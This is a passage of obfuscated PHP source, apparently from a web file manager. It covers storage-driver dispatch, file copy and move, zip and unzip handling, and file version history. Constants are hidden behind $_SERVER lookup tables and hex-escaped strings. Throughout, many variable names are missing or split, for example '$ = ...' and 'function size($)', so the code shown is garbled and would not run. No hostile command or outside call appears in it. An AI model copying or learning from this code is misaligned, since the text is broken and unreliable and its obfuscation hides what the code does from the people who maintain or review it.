$this->fileOutImageServer($π, $祗); } $֓ݩ = $this->link($π, $_SERVER[][1741] . $祗); $this->fileOutLink($֓ݩ); } public function fileOutImageServer($, $׋ = 250) { parent::fileOutImage($, $׋); } public function hashMd5($) { $֑ =& $_SERVER[]; $ء = $this->objectMeta($); return isset($ء[$֑[245]]) ? $ء[$֑[245]] : !1; $ꮺ = $this->link($, $֑[1742]); } public function size($夽) { $ = $this->objectMeta($夽); return $ ? $[$_SERVER[][79]] : 0; } public function info($׵) { if ($this->isFolder($׵)) { return $this->folderInfo($׵); } else { if ($this->isFile($׵)) { return $this->fileInfo($׵); } } return !1; } public function exist($) { return $this->isFile($) || $this->isFolder($); } public function isFile($) { return !$this->isFolder($) && $this->objectMeta($); } public function isFolder($) { return $this->cacheMethod($_SERVER[][177], $); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[][179], $); } protected function _objectMeta($) { $͵ =& $_SERVER[]; list($, $) = $this->bucketManager->stat($this->bucket, $); if ($) { $[$͵[79]] = intval($[$͵[1730]]); } return $; } protected function _isFolder($֯) { $۳ =& $_SERVER[]; if ($֯ == $۳[12] || $֯ == $۳[8]) { return !0; } list($, $ӄ) = $this->bucketManager->listFiles($this->bucket, trim($֯, $۳[8]) . $۳[8], $۳[12], 1, $۳[8]); return !empty($[$۳[1733]]) || !empty($[$۳[1734]]) ? !0 : !1; } } goto Dܫ; B: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($, $ہ) { $ӗ =& $_SERVER[]; $֋ = $ہ; $GLOBALS[$ӗ[1325]] = $ӗ[1326] . $; Hook::trigger($ӗ[1326] . $ . $ӗ[1327], $֋); $ = self::driverMake($ہ[0]); if (!$) { return !1; } if ($ == $ӗ[641] || $ == $ӗ[643] || $ == $ӗ[1328]) { if (!trim($->path . $ӗ[463], $ӗ[8])) { return !1; } } if (method_exists($, $)) { $Ȟ܇ = @call_user_func_array(array($, $), $ہ); } else { if (method_exists($, $ӗ[1329])) { $Ȟ܇ = @call_user_func_array(array($, $), $ہ); } else { if (method_exists(self, $)) { $Ȟ܇ = @call_user_func_array(array(self, $), $ہ); } else { $Ȟ܇ = call_user_func_array(array(parent, $), $ہ); } } } Hook::trigger($ӗ[1326] . $ . $ӗ[1330], $֋, $Ȟ܇); return $Ȟ܇; } public static function init($) { return self::driverMake($); } public static function copy($ӏ, $, $ = false, $꠼ = false) { return self::copyMoveStart($ӏ, $, $, $_SERVER[][641], $꠼); } public static function move($Õ鄨, $у, $ = false, $ = false) { return self::copyMoveStart($Õ鄨, $у, $, $_SERVER[][643], $); } public static function copyMoveChildren($, $Қ, $󽾀 = "\x63\x6f\x70\171", $ = REPEAT_REPLACE) { $ꨘ =& $_SERVER[]; $ = $; $ = self::driverMake($); $ѓ΁ = $->listPath($, !0); $ٚހ = array_merge($ѓ΁[$ꨘ[86]], $ѓ΁[$ꨘ[85]]); foreach ($ٚހ as $) { self::copyMoveStart($[$ꨘ[87]], $Қ, $, $󽾀, !1); } if ($󽾀 == $ꨘ[643]) { self::remove($); } } private static function copyMoveStart($, $ԓ, $, $Ѥ, $) { $ =& $_SERVER[]; $Ȟ = array($, $ԓ, $, $); Hook::trigger($[1326] . $Ѥ . $[1327], $Ȟ); $ = self::copyMove($, $ԓ, $, $Ѥ, $); Hook::trigger($[1326] . $Ѥ . $[1330], $Ȟ, $); return $; } public static function saveFile($퍮, $Ü, $Ք։ = true) { $ȣ =& $_SERVER[]; $ʉԆ = self::info($Ü); $г = self::driverMake($퍮); $ = self::driverMake($Ü); $ = !1; if ($->pathParse[$ȣ[1331]]) { $ = $; $〶 = $->pathParse[$ȣ[1331]]; $ = self::driverMake($〶); } if ($г->pathParse[$ȣ[1331]]) { $ = $г->pathParse[$ȣ[1331]]; $г = self::driverMake($); } $ț = $->pathFather($Ü); $ݎ = !0; if (!$Ք։ && self::driverIsSame($г, $)) { $ݎ = !1; } $삩۠ = self::copyFile($г, $퍮, $, $ț, $ʉԆ[$ȣ[32]], $ݎ); if ($) { $삩۠ = $->getPathOuter($삩۠); } return $삩۠; } private static function copyMove($χ, $Ɗ, $̻, $, $ = false) { $ =& $_SERVER[]; if (!$χ || $χ == $[8] || !$Ɗ) { return !1; } ignore_timeout(); $˨ = self::driverMake($χ); $ = self::driverMake($Ɗ); $ = $ == $[643]; $ = !1; if ($->pathParse[$[1331]]) { $ = $; $Ɗ = $->pathParse[$[1331]]; $ = self::driverMake($Ɗ); } if ($˨->pathParse[$[1331]]) { $χ = $˨->pathParse[$[1331]]; $˨ = self::driverMake($χ); } self::check($˨, $χ, $, $Ɗ); Hook::trigger($[1332], $˨, $χ, $, $Ɗ); $ = self::driverIsSame($˨, $); if ($) { if ($ == $[643] && !method_exists($, $[1333]) && trim($Ɗ, $[8]) == trim($->pathFather($χ), $[8])) { if ($˨->pathThis($χ) != $ && !$˨->isOsDriver()) { return $˨->rename($χ, $); } return $->getPathOuter($χ); } if (method_exists($, $)) { return $->{$}($χ, $Ɗ, $̻, $); } } if ($ && $ == $[643] && $->getType() == $[106]) { $˙ = $->movePath($χ, $Ɗ, $); if ($˙) { return $˙; } } $Ɏ = $˨->isFile($χ); if (!$Ɏ && $->getType() == $[852] && $˨->getType() == $[106]) { $˙ = $->copyFolderFromIO($˨, $χ, $Ɗ, $̻, $, $); } else { $˙ = self::copyPath($˨, $χ, $, $Ɗ, $̻, $, $Ɏ, $); } if ($˙ && $) { $˨->remove($χ); } if ($) { $˙ = $->getPathOuter($˙); } return $˙; } private static function check($, $ī, $, &$ƹ) { $¿޷ =& $_SERVER[]; if (self::driverIsSame($, $) && $->isFolder($ī) && $->isParentOf($ī, $ƹ)) { show_json(LNG($¿޷[1334]), !1); } if (!$->exist($ī)) { show_json(LNG($¿޷[105]), !1); } } private static function copyPath($, $ɞ, $ԡ, $, $ۖ, $֧, $, $ = false, $ʂ = true) { $ =& $_SERVER[]; $ = empty($) && $ !== $[228] ? $->pathThis($ɞ) : $; if ($ۖ) { $ = $ԡ->fileNameExist($, $); $ֱ = $; $ = $ԡ->fileNameAuto($, $, $ۖ, !$); if (!$ || $ֱ != $) { $ۖ = !1; } if ($ʂ && !$ۖ) { $ԡ->_data[$[1335]] = !0; } } if ($) { return self::copyFile($, $ɞ, $ԡ, $, $, $֧); } if ($ۖ == REPEAT_RENAME_FOLDER) { $ۖ = !1; } $㊖ = rtrim($, $[8]) . $[8] . $; $̘ = $ԡ->mkdir($ԡ->getPath($㊖), $ۖ); $ = $ԡ->getPathInner($̘); $ = $->listPath($ɞ, !0); $ = is_array($) ? $ : array($[86] => array(), $[85] => array()); $ = array_merge($[$[86]], $[$[85]]); foreach ($ as $) { $ = $[$[33]] == $[230]; $ɞ = $->getPathInner($[$[87]]); $ = self::copyPath($, $ɞ, $ԡ, $, $ۖ, $֧, $, !1, !1); if (!$) { IO::errorTips($[1336] . $ɞ . $[73] . $); } } self::copyMoveKeepInfo($, $ɞ, $̘); return $̘; } private static function copyFile($э, $, $鑎, $, $, $) { $ =& $_SERVER[]; $ = $鑎->getPath(rtrim($, $[8]) . $[8] . $); $Ė = $[1337] . time() . rand_string(5); Hook::trigger($[1338], $э, $, $鑎, $, $, $Ė); if (self::driverIsSame($э, $鑎)) { if ($) { $ = $鑎->moveFile($, $); } else { $ = $鑎->copyFile($, $); } Hook::trigger($[1339], $э, $, $鑎, $, $, $); self::copyMoveKeepInfo($э, $, $); return $; } $۠š = TEMP_FILES; if ($GLOBALS[$[6]][$[92]][$[892]]) { $۠š = $GLOBALS[$[6]][$[92]][$[892]]; } $̝ = $۠š; mk_dir($̝); $ޛ = $̝ . $Ė; $ = $ޛ; $ޛ = $э->download($, $ޛ); $ޛ = $э->iconvApp($ޛ); if (substr($ޛ, strlen($۠š)) == $۠š) { $ = !0; } $ = $鑎->upload($, $ޛ, $); self::remove($); Hook::trigger($[1339], $э, $, $鑎, $, $, $); self::copyMoveKeepInfo($э, $, $); return $; } private static function copyMoveKeepInfo($툎, $Ќð, $) { if (!$) { return; } $ت = $툎->info($Ќð); if (!is_array($ت)) { return; } IO::setModifyTime($, $ت[$_SERVER[][88]]); } public static function pathFather($׊) { $ƪ = IO::init($׊); $҉ຂ = $ƪ->pathFather($ƪ->path); return $ƪ->getPathOuter($҉ຂ); } public static function fileOut($ӥ綒, $İ = false, $ = false, $· = '') { $ë = self::driverMake($ӥ綒); if ($ë->isFileOutServer()) { return $ë->fileOutServer($ӥ綒, $İ, $, $·); } return $ë->fileOut($ӥ綒, $İ, $, $·); } public static function fileOutImage($ᣳ, $ = 250) { $撽 = array(250, 600, 1200, 2000, 3000, 5000); for ($Ӽ = 0; $Ӽ < count($撽); $Ӽ++) { if ($Ӽ == 0 && $ <= $撽[$Ӽ]) { $ = $撽[$Ӽ]; break; } else { if ($ > $撽[$Ӽ - 1] && $ <= $撽[$Ӽ]) { $ = $撽[$Ӽ]; break; } else { if ($Ӽ == count($撽) - 1 && $ > $撽[$Ӽ]) { $ = $撽[$Ӽ]; break; } } } } $氽 = self::driverMake($ᣳ); if ($氽->isFileOutServer()) { return $氽->fileOutImageServer($ᣳ, $); } return $氽->fileOutImage($ᣳ, $); } private static function driverIsSame($ǿ, $Ò) { $͌ =& $_SERVER[]; $ = $ǿ->getType(); $ތ = $Ò->getType(); if ($ != $ތ) { return !1; } if ($ == $͌[852]) { return !0; } if ($ == $͌[106]) { return !0; } if ($ǿ->pathDriver == $Ò->pathDriver) { return !0; } return !1; } public static function copyUpdate($ܜܶ, $) { $п =& $_SERVER[]; if (!IO::exist($ܜܶ)) { return !1; } if (!IO::exist($)) { IO::mkdir($); } $ = array_to_keyvalue(self::listAllSimple($ܜܶ), $п[87]); $ = array_to_keyvalue(self::listAllSimple($), $п[87]); $ࡌ = array(); $ц = array(); foreach ($ as $ => $) { if (isset($[$])) { if ($[$п[78]] == 1) { continue; } if ($[$][$п[79]] == $[$п[79]]) { continue; } } if ($[$п[78]] == 1) { $ц[] = $ . $п[8] . trim($, $п[8]); continue; } $̶ = strstr(trim($, $п[8]), $п[8]) ? get_path_father($) : $п[12]; $ࡌ[] = array($п[1340] => $[$п[89]], $п[1341] => rtrim($, $п[8]) . $п[8] . $̶, $п[1342] => $); } $ = array($п[230] => $ࡌ, $п[78] => $ц); Hook::trigger($п[1343], $ܜܶ, $, $); foreach ($ц as $) { IO::mkdir($); } foreach ($ࡌ as $) { IO::copy($[$п[1340]], $[$п[1341]], REPEAT_REPLACE); } } public static function fileSubstr($ʉ, $Ү, $寻̛ = false) { $͝ =& $_SERVER[]; $ώ = self::driverMake($ʉ); $Ӳݩ = $ώ->size($ʉ); $ē = $Ү; $ą = $寻̛; if ($Ү < 0) { $Ү = $Ӳݩ + $Ү; } if ($寻̛ === !1) { $寻̛ = $Ӳݩ - $Ү; } if ($Ү + $寻̛ > $Ӳݩ) { $寻̛ = $Ӳݩ - $Ү; } if (!$Ӳݩ && $ώ->getType() == $͝[106] && !$ώ->exist($ʉ)) { $֏ = get_path_this($ʉ); $ = parse_url_query($֏); if (is_array($) && isset($[$͝[32]])) { $֏ = urldecode($[$͝[32]]); } throw new Exception($͝[1344] . LNG($͝[1345]) . $͝[1128] . clear_html($֏) . $͝[12]); } if ($寻̛ <= 0) { return $͝[12]; } if ($Ү < 0 || $Ү >= $Ӳݩ || $寻̛ > $GLOBALS[$͝[6]][$͝[92]][$͝[1346]]) { throw new Exception("\146\x69\x6c\145\122\145\x61\x64\40\x65\162\162\x6f\x72\x2c\x6f\x76\145\162\40\151\x6f\x52\x65\x61\144\x4d\141\x78\x21\40\163\x74\x61\x72\x74\x3d{$Ү}\73\154\x65\x6e\x67\x74\x68\x3d{$寻̛}\x3b\40\x73\x69\172\x65\x3d{$Ӳݩ}\73"); } $͠ = $ώ->fileSubstr($ʉ, $Ү, $寻̛); if (!$͠ && $寻̛ && isset($GLOBALS[$͝[1347]])) { throw new Exception($GLOBALS[$͝[1347]][$͝[1348]]); } return $͠; } private static function driverMake(&$ԑ) { $敱 =& $_SERVER[]; $Ȭ = KodIO::parse($ԑ); if (!self::$driverListSystem) { $ޜ = Model($敱[862])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ޜ, $敱[487]); } if ($Ȭ[$敱[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ȭ[$敱[487]]]) { throw new Exception($敱[1349]); return !1; } $ԑ = $Ȭ[$敱[1350]]; $ = self::driverGet($Ȭ, $ԑ); return $; } private static function driverGet($, &$) { $ݣݸ =& $_SERVER[]; $Þ = $[$ݣݸ[1351]]; $ = $[$ݣݸ[487]]; switch ($[$ݣݸ[33]]) { case KodIO::KOD_IO: $Ĝ = self::$driverListSystem[$]; break; case KodIO::KOD_SOURCE: $ = $ . $; $Ĝ = array($ݣݸ[1352] => $ݣݸ[1353], $ݣݸ[6] => $); $Ĝ[$ݣݸ[6]][$ݣݸ[1354]] = $[$ݣݸ[487]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ = $GLOBALS[$ݣݸ[1355]]; self::$driverListUser = array_to_keyvalue($, $ݣݸ[487]); } $Ĝ = self::$driverListUser[$]; break; case KodIO::KOD_SHARE_LINK: $Ĝ = array($ݣݸ[1352] => $ݣݸ[1356], $ݣݸ[6] => $); $ = Action($ݣݸ[1357])->sharePathInfo($[$ݣݸ[87]]); $ = $[$ݣݸ[191]]; if (!$[$ݣݸ[191]]) { $é = Model($ݣݸ[686])->getInfoByHash($[$ݣݸ[487]]); $ = KodIO::clear($é[$ݣݸ[583]] . $[$ݣݸ[1350]]); $[$ݣݸ[576]] = $é; $[$ݣݸ[1331]] = $; $Ĝ = array($ݣݸ[1352] => $ݣݸ[1358], $ݣݸ[6] => $); } else { $Ĝ[$ݣݸ[6]][$ݣݸ[1354]] = $[$ݣݸ[191]]; } break; case KodIO::KOD_SHARE_ITEM: $Ĝ = array($ݣݸ[1352] => $ݣݸ[1359], $ݣݸ[6] => $); $é = Model($ݣݸ[686])->getInfo($[$ݣݸ[487]]); if ($é[$ݣݸ[191]] == $ݣݸ[228]) { $ = KodIO::clear($é[$ݣݸ[583]] . $[$ݣݸ[1350]]); $[$ݣݸ[576]] = $é; $[$ݣݸ[1331]] = $; $Ĝ = array($ݣݸ[1352] => $ݣݸ[1360], $ݣݸ[6] => $); } else { if (!$) { $ = $é[$ݣݸ[191]]; } $Ĝ[$ݣݸ[6]][$ݣݸ[1354]] = $é[$ݣݸ[191]]; } break; case KodIO::KOD_SHARE_OUTER: $Ĝ = array($ݣݸ[1352] => $ݣݸ[1361], $ݣݸ[6] => $); break; default: $ = $[$ݣݸ[87]]; $Ĝ = array($ݣݸ[1352] => $ݣݸ[1362]); break; } $ = $[$ݣݸ[87]]; if (!isset(self::$driverCache[$])) { $х = strtolower($Ĝ[$ݣݸ[96]]); $ = $GLOBALS[$ݣݸ[6]][$ݣݸ[92]][$ݣݸ[928]]; $ʌ = $ݣݸ[77] . (isset($[$х]) ? $[$х] : ucfirst($х)); if (!class_exists($ʌ)) { show_json("{$ʌ}\40\x6e\x6f\164\x20\x65\170\151\x73\164\163\41", !1); } $ = isset($Ĝ[$ݣݸ[6]]) ? $Ĝ[$ݣݸ[6]] : !1; self::$driverCache[$] = new $ʌ($); } $稩 = self::$driverCache[$]; $稩->pathDriver = $Þ; $稩->pathBase = $ݣݸ[12]; if (isset($Ĝ[$ݣݸ[6]][$ݣݸ[1363]])) { $稩->pathBase = rtrim($Ĝ[$ݣݸ[6]][$ݣݸ[1363]], $ݣݸ[8]) . $ݣݸ[8]; $ = $稩->pathBase . ltrim($, $ݣݸ[8]); } $ = $稩->getPath($); if (isset($[$ݣݸ[1331]])) { $ = $[$ݣݸ[1331]]; } $稩->path = $; return $稩; } public static function errorTips($ = false, $ؑ = true) { $Ÿ =& $_SERVER[]; static $ = array(); $娛 = 100; if ($ === -1) { return $ ? $[count($) - 1] : $Ÿ[12]; } if ($ === !1) { return implode($Ÿ[285], $); } if (count($) >= $娛) { $ = array_slice($, $娛 * 0.5, $娛); } $[] = $; if (!$ؑ) { return; } write_log($Ÿ[173] . ACTION . $Ÿ[1364] . $, $Ÿ[1365]); } public static function getLastError($ = '') { $ = self::errorTips(-1); return $ ? $ : $; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ؗ냔; if ($ؗ냔) { return $ؗ냔; } $ = IO::init($_SERVER[][8]); return $; } private static function iconvSystem($) { return self::local()->iconvSystem($); } private static function iconvApp($) { return self::local()->iconvApp($); } public static function zipFolder($腉, $ = "\172\x69\160", $❘ = '', $ = REPEAT_RENAME) { $Ýͺ =& $_SERVER[]; $ϹҴ = IO::listPath($腉); if (!$ϹҴ) { return !1; } $ϹҴ = array_merge($ϹҴ[$Ýͺ[85]], $ϹҴ[$Ýͺ[86]]); return self::zip($ϹҴ, $, $❘, $); } public static function zip($, $ݡ = "\172\151\x70", $ = '', $ = REPEAT_RENAME) { $㤯 =& $_SERVER[]; if (is_string($) && $) { $ = array(array($㤯[87] => $)); } $ӕ = self::init($[0][$㤯[87]]); $ = self::info($[0][$㤯[87]]); $ܛ߆ = $㤯[12]; $䰇 = $㤯[12]; $ = $㤯[12]; if ($ && substr($, -1, 1) != $㤯[8]) { $䰇 = get_path_father($); $ = get_path_this($); } else { $䰇 = self::pathFather($[$㤯[87]]); $ = $[$㤯[32]] . $㤯[10] . $ݡ; if (count($) > 1) { $暾 = IO::info($䰇); $ = $暾[$㤯[32]] . $㤯[10] . $ݡ; } if ($) { $䰇 = $; } } if ($ӕ->getType() == $㤯[106]) { $廙 = self::init($䰇); $» = $廙->getType() == $㤯[106] ? $䰇 : get_path_father($ӕ->path); $» = IO::getPathInner($»); $» = rtrim($», $㤯[8]) . $㤯[8]; mk_dir($»); } else { $ܛ߆ = TEMP_FILES . $㤯[1366] . time() . rand_string(8) . $㤯[8]; mk_dir($ܛ߆); file_put_contents($ܛ߆ . $㤯[1367], $㤯[12]); $» = $ܛ߆; } $ށ = IO::info($»); if (!$ށ || !$ށ[$㤯[233]]) { show_json(LNG($㤯[1368]), !1); } $ = self::zipFileList($, $ܛ߆); foreach ($ as $ȧ => $) { $[$ȧ] = self::iconvSystem($); } $Ɇ = get_filename_auto($» . $, $㤯[12], $); KodArchive::create(self::iconvSystem($Ɇ), $); if (!IO::exist($Ɇ)) { if ($ܛ߆) { del_dir($ܛ߆); } write_log($㤯[1369] . $Ɇ, $㤯[388]); show_json(LNG($㤯[1370]), !1); } if (!$ܛ߆) { return $Ɇ; } $ = self::move($Ɇ, $䰇, $); if ($ܛ߆) { del_dir($ܛ߆); } if (!$Ɇ) { write_log($㤯[1371] . $Ɇ . $㤯[1372] . $䰇, $㤯[388]); show_json(LNG($㤯[1370]), !1); } return $; } public static function unzip($, $, $֦ = "\x2d\61", $ѱ = "\x72\145\x70\x6c\x61\x63\x65") { $ =& $_SERVER[]; $ = parent::info($); if (!$) { show_json(LNG($[1373]), !1); } $Õ = IO::infoFullSimple($); if (!$Õ) { $ = IO::mkdir($); } if (isset($Õ[$[191]]) && trim($Õ[$[87]], $[8]) != trim($, $[8])) { $ꔢ = KodIO::make($Õ[$[190]]); $ᨀ = IO::fileNameAuto($ꔢ, $Õ[$[32]], REPEAT_RENAME_FOLDER, !0); $ = IO::mkdir($ꔢ . $ᨀ); } $֦ = $֦ && $֦ != $[1374] ? @json_decode($֦, !0) : -1; $Ϛ = self::unzipPart($, $֦); if (!$Ϛ || !IO::exist($Ϛ[$[230]])) { show_json(LNG($[105]), !1); } $ɇ = $Ϛ[$[1375]][count($Ϛ[$[1375]]) - 1]; if ($ɇ[$[1303]] == -1 || substr($ɇ[$[32]], -1, 1) == $[8]) { $վݘ = $Ϛ[$[1376]] . rand_string(10) . $[8]; mk_dir($վݘ); $ = count($Ϛ[$[1375]]) == 1 ? IO::ext($) : get_path_ext($Ϛ[$[230]]); $ݐ = KodArchive::extract(self::iconvSystem($Ϛ[$[230]]), $վݘ, $ɇ[$[1303]], $ᨀ, $); self::unzipErrorCheck($ݐ, array($[1377], $, $, $, $Ϛ)); Hook::trigger($[1378], $վݘ); recursion_dir($վݘ, $, $۩, 0); $퉽 = array_merge($, $۩); $ = array(); foreach ($퉽 as $) { $ = IO::move(self::iconvApp($), $, $ѱ); if ($) { $[] = $; } } del_dir($վݘ); } else { $ = IO::move($Ϛ[$[230]], $, $ѱ, get_path_this($ɇ[$[32]])); if ($) { $[] = $; } } return $ ? $ : !1; } public static function unzipList($Ć) { $ =& $_SERVER[]; $Ť = isset($Ć[$[1379]]) ? $Ć[$[1379]] : !1; $ۘ = isset($Ć[$[1303]]) ? @json_decode($Ć[$[1303]], !0) : -1; $ = self::unzipPart($Ć[$[87]], $ۘ); if (!$ || !IO::exist($[$[230]])) { show_json(LNG($[105]), !1); } $ѹڶ = $[$[1375]][count($[$[1375]]) - 1]; $ = in_array(IO::ext($[$[230]]), array($[388], $[1380], $[1381], $[1382], $[1383], $[1384])); if (!$Ť && ($ѹڶ[$[1303]] == -1 || $)) { $ě = $[$[1376]] . get_path_this($[$[230]]) . $[954]; if (!IO::exist($ě)) { $č = $ѹڶ[$[1303]] == -1 ? get_path_ext(IO::pathThis($Ć[$[87]])) : get_path_ext($[$[230]]); $ = KodArchive::listContent(self::iconvSystem($[$[230]]), !0, $č); self::unzipErrorCheck($, array($[1385], $Ć, $)); @file_put_contents($ě, json_encode($[$[1386]])); } return @json_decode(IO::getContent($ě), !0); } IO::fileOut($[$[230]], $Ť, get_path_this($ѹڶ[$[32]])); die; } private static function zipFileList($ Ɖ, $ = false) { $᫹؉ =& $_SERVER[]; $㬜 = array(); foreach ($ Ɖ as $) { $ = $[$᫹؉[87]]; if ($) { $ = self::copy($[$᫹؉[87]], $, $᫹؉[921]); } else { $ѫ = self::init($[$᫹؉[87]]); if ($ѫ->getType() == $᫹؉[106]) { $ = $ѫ->path; } } if ($ && self::local()->exist($)) { $㬜[$[$᫹؉[87]]] = $; } } if (!empty($㬜)) { return array_values($㬜); } show_json(LNG($᫹؉[1345]), !1); } private static function localFilePath($ٲ) { $ =& $_SERVER[]; $睪 = KodIO::parse($ٲ); if ($睪[$[33]] == KodIO::KOD_SOURCE) { $ = Model($[927])->fileInfoGet(KodIO::sourceID($ٲ)); if (!$[$[87]]) { show_json($[1387], !1); } $ٲ = $[$[87]]; } $Ä = self::init($ٲ); if ($Ä->pathParse[$[1331]]) { $ٲ = $Ä->pathParse[$[1331]]; $Ä = self::init($ٲ); } $ = $Ä->getType(); if ($ == $[106] || $ == $[1388]) { if (!$Ä->exist($Ä->path)) { show_json(LNG($[105]), !1); } return $Ä->path; } return !1; } public static function unzipPart($ȋ, $ː® = -1) { $ =& $_SERVER[]; $ף = IO::pathThis($ȋ); if (!$ː® || $ː® == -1) { $㣇 = array(array($[32] => $ף, $[1303] => -1)); $㣇[0][$[1389]] = $㣇[0][$[32]]; } else { if (is_array($ː®)) { $㣇 = $ː®; $ח = count($㣇) - 1; for ($ = 0; $ <= $ח; $++) { $＃ = $㣇[$]; $珒 = get_path_this($＃[$[32]]) . (checkExtSafe($＃[$[32]]) ? $[12] : $[1390]); $㣇[$][$[1389]] = $[1391] . intval($＃[$[1303]]) . $[476] . $珒; if ($ == 0) { continue; } $㣇[$][$[1389]] = $㣇[$ - 1][$[1389]] . $[1392] . $㣇[$][$[1389]]; } } } if (!is_array($㣇) || count($㣇) == 0) { return !1; } $ = $㣇[count($㣇) - 1]; if (!IO::exist($ȋ)) { return !1; } $ģ = TEMP_FILES . $[1393] . kodIO::hashPathSafe($ȋ) . $[8]; $ǝ = $ģ . $[$[1389]]; mk_dir($ģ); file_put_contents(TEMP_FILES . $[1367], $[12]); if (IO::exist($ǝ)) { return array($[230] => $ǝ, $[1375] => $㣇, $[1376] => $ģ); } $ = self::localFilePath($ȋ); if (!$) { $ = $ģ . $[1394]; if (!IO::exist($)) { self::copy($ȋ, $ģ, !1, get_path_this($)); } } if (!$ || !IO::exist($)) { return !1; } if ($[$[1303]] == -1) { return array($[230] => $, $[1375] => $㣇, $[1376] => $ģ); } $ޫ = $; foreach ($㣇 as $ => $＃) { if (!$＃ || $＃[$[1303]] == $[1374]) { break; } if (substr($＃[$[32]], -1, 1) == $[8]) { break; } $ǉ = in_array(get_path_ext($＃[$[1389]]), array($[388], $[1380], $[1381], $[1382], $[1383], $[1384])); $ҳ = $ == count($㣇) - 1 && $ǉ; $ = $ģ . $＃[$[1389]]; $ = $ģ . get_path_this($＃[$[32]]); if (IO::exist($)) { $ޫ = $; continue; } $ = $ == 0 ? get_path_ext($ף) : get_path_ext($ޫ); $ = KodArchive::extract(self::iconvSystem($ޫ), $ģ, $＃[$[1303]], $Ӌ, $); self::unzipErrorCheck($, array($[1395], $ȋ, $㣇, $＃, $)); if (IO::exist($)) { IO::rename($, get_path_this($)); } $ޫ = $; } $ǝ = $ޫ; return array($[230] => $ޫ, $[1375] => $㣇, $[1376] => $ģ); } private static function unzipErrorCheck($, $ = false) { $ =& $_SERVER[]; if ($[$[1396]]) { return !0; } write_log(array($[1397], $, $), $[1398]); $ = is_array($[$[1386]]) ? json_encode($[$[1386]]) : $[$[1386]]; show_json($[1399] . $, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ӵ =& $_SERVER[]; $ = $GLOBALS[$Ӵ[6]][$Ӵ[92]]; if ($[$Ӵ[1400]] != 1) { return; } if ($[$Ӵ[1401]] <= 0) { return; } if (isset($_REQUEST[$Ӵ[1402]]) && $_REQUEST[$Ӵ[1402]] == $Ӵ[91]) { return; } Hook::bind($Ӵ[1403], $Ӵ[1404]); Hook::bind($Ӵ[1405], $Ӵ[1406]); Hook::bind($Ӵ[1407], $Ӵ[1408]); Hook::bind($Ӵ[1409], $Ӵ[1410]); Hook::bind($Ӵ[1411], $Ӵ[1412]); Hook::bind($Ӵ[1413], $Ӵ[1414]); } public static function eventBeforeUpload($ܠ) { if ($ܠ[3] && $ܠ[3] != REPEAT_REPLACE) { return; } $ = self::parsePath($ܠ[0]); if (!$) { return; } self::add($); } public static function eventBeforeEdit($) { $Ӳ = self::parsePath($[0]); if (!$Ӳ) { return; } self::add($Ӳ); } public static function eventBeforeCopyFile($ޛ, $βǱ, $Ř, $Շ, $Ԓѳ, $Ƥ։) { $܆ =& $_SERVER[]; if (isset($Ř->_data[$܆[1335]]) && $Ř->_data[$܆[1335]]) { return; } $Ҡڶ = $Ř->getPathOuter($Շ); $ = self::parsePath($Ҡڶ); if (!$) { return; } self::add($); } public static function eventBeforeRename($) { $̚ =& $_SERVER[]; $ݭ = self::parsePath($[0]); if (!$ݭ) { return; } $փ = self::checkInHistory($ݭ); if (!$փ) { return; } if ($փ[$̚[33]] == $̚[230]) { $ = self::listData($ݭ); if ($ && $[$̚[446]]) { self::moveHistory($ݭ, $[1]); } } else { IO::rename($փ[$̚[87]], $[1]); } } public static function eventBeforeMove($ц) { $획 =& $_SERVER[]; $ѹ = self::parsePath($ц[0]); if (!$ѹ) { return; } $󋢗 = self::parsePath($ц[1]); if (!$󋢗) { return; } $ȕ = $ц[3]; $ = self::checkInHistory($ѹ); if (!$) { return; } $ݟ = self::pathHistory($󋢗); if ($[$획[33]] == $획[230]) { $ = self::listData($ѹ); $޽ = rtrim($󋢗, $획[8]) . $획[8] . ($ȕ ? $ȕ : get_path_this($ѹ)); $띣 = self::listData($޽); if ($ && $[$획[446]] && $띣 && $띣[$획[446]]) { return self::clear($ѹ); } if ($ && $[$획[446]]) { self::moveHistory($ѹ, $ȕ, $ݟ); } } else { IO::move($[$획[87]], $ݟ, !1, $ȕ); self::clearEmptyFolder(IO::pathFather($[$획[87]])); } } public static function eventAfterRemove($ǐ, $҇ޙ) { $ =& $_SERVER[]; if (!$҇ޙ) { return; } $ = self::parsePath($ǐ[0]); if (!$) { return; } $ = self::checkInHistory($); if (!$) { return; } if ($[$[33]] == $[230]) { $ȏ = self::listData($, !1); if ($ȏ && $ȏ[$[446]]) { self::clear($, !1); } } else { IO::remove($[$[87]]); self::clearEmptyFolder(IO::pathFather($[$[87]])); } } private static function checkInHistory($ˮθ) { $ʗ = self::pathHistory($ˮθ); if (!IO::exist($ʗ)) { $ʗ .= $_SERVER[][1415]; } return IO::exist($ʗ) ? IO::info($ʗ) : !1; } private static function parsePath($) { $򜪟 =& $_SERVER[]; if (!$) { return !1; } if (isset($GLOBALS[$򜪟[1416]]) && $GLOBALS[$򜪟[1416]]) { return; } $ל = KodIO::parse($); $հ = $ל[$򜪟[33]]; $љ = !$հ || $հ == KodIO::KOD_IO || $հ == KodIO::KOD_SHARE_ITEM; if (!$љ || !$ל[$򜪟[1417]]) { return !1; } if (substr($, 0, strlen(DATA_PATH . $򜪟[1418])) == DATA_PATH . $򜪟[1418]) { return !1; } if ($հ == KodIO::KOD_SHARE_ITEM) { $³ = IO::init($); if ($³->pathParse[$򜪟[1331]]) { return self::parsePath($³->pathParse[$򜪟[1331]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ҁ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $򜪟[1419]); foreach ($ҁ as $) { if (!$հ && substr($, 0, strlen($)) == $) { return !1; } } self::log($GLOBALS[$򜪟[1325]] . $򜪟[1420] . $); return $; } private static function pathHistory($) { $ =& $_SERVER[]; $ܾ = self::$_historyBase . ltrim(KodIO::clear($), $[8]); $ܾ = str_replace(array($[1421]), array($[1422]), $ܾ); return $ܾ; } public static function log($б) { } public static function historyCount($) { $˭ =& $_SERVER[]; $ = array(); $Ң = array(); foreach ($ as $ҷ) { $ = get_path_father($ҷ); if (!$Ң[$]) { $Ң[$] = array(); } $Ң[$][] = 